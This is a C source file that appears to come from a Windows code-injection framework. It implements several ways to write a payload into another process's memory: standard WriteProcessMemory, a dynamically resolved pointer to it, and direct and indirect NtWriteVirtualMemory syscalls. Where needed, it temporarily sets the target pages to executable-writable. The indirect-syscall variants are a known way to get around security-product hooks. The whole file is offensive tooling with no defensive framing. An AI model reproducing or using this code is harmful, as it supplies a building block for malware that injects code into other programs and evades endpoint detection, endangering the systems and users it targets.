#include "write.h"
#include "resolver.h"
#include "engine.h"
#include "protect.h"
#include "dispatch.h"

BOOL Win32Write(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(ctx->pRemoteAddress, payload, ctx->payloadSize);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    return WriteProcessMemory(ctx->hProcess,
                              ctx->pRemoteAddress,
                              (PVOID)payload,
                              ctx->payloadSize,
                              NULL);
}

BOOL DFRWrite(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    if (ctx->hProcess == (HANDLE)-1)
    {
        __try {
            memcpy(ctx->pRemoteAddress, payload, ctx->payloadSize);
            return TRUE;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return FALSE;
        }
    }

    if (!g_WriteProcessMemory)
        return FALSE;

    return g_WriteProcessMemory(ctx->hProcess,
                                ctx->pRemoteAddress,
                                (PVOID)payload,
                                ctx->payloadSize,
                                NULL);
}

BOOL QueryMemoryProtection(HANDLE hProcess, PVOID address, PDWORD pProtect)
{
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result = 0;

    if (hProcess == NtCurrentProcess())
        result = VirtualQuery(address, &mbi, sizeof(mbi));
    else
        result = VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi));

    if (result == 0)
        return FALSE;

    *pProtect = mbi.Protect;
    return TRUE;
}

BOOL NeedsWritePermission(DWORD protect)
{
    return !(protect & (PAGE_READWRITE | PAGE_EXECUTE_READWRITE));
}

BOOL DirectWrite(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    HANDLE target = (ctx->hProcess == (HANDLE)-1)
                    ? NtCurrentProcess()
                    : ctx->hProcess;

    DWORD currentProt = 0;

    if (!QueryMemoryProtection(target, ctx->pRemoteAddress, &currentProt))
        return FALSE;

    ULONG oldProt = currentProt;

    // check if permissions need to be changed
    BOOL needWrite = NeedsWritePermission(currentProt);
    if (needWrite)
    {
        if (!DirectProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt))
            return FALSE;
    }

    SIZE_T bytesWritten = 0;
    NTSTATUS status = SysNtWriteVirtualMemory(target,
                                              ctx->pRemoteAddress,
                                              (PVOID)payload,
                                              ctx->payloadSize,
                                              &bytesWritten);

    // we changed protection to complete the write operation, change it back                                    
    if (needWrite)
        DirectProtect(ctx, oldProt, NULL);

    return (status == 0 && bytesWritten > 0);
}

BOOL IndirectWrite(PINJECTION_CONTEXT ctx, LPCVOID payload)
{
    HANDLE target = (ctx->hProcess == (HANDLE)-1)
                    ? NtCurrentProcess()
                    : ctx->hProcess;

    DWORD currentProt = 0;

    if (!QueryMemoryProtection(target, ctx->pRemoteAddress, &currentProt))
        return FALSE;

    ULONG oldProt = currentProt;
    BOOL needWrite = NeedsWritePermission(currentProt);
    if (needWrite)
    {
        if (!IndirectProtect(ctx, PAGE_EXECUTE_READWRITE, &oldProt))
            return FALSE;
    }

    SIZE_T bytesWritten = 0;
    NTSTATUS status = IndirectSysNtWriteVirtualMemory(target,
                                                      ctx->pRemoteAddress,
                                                      (PVOID)payload,
                                                      ctx->payloadSize,
                                                      &bytesWritten);

    if (needWrite)
        IndirectProtect(ctx, oldProt, NULL);

    return (status == 0 && bytesWritten > 0);
}
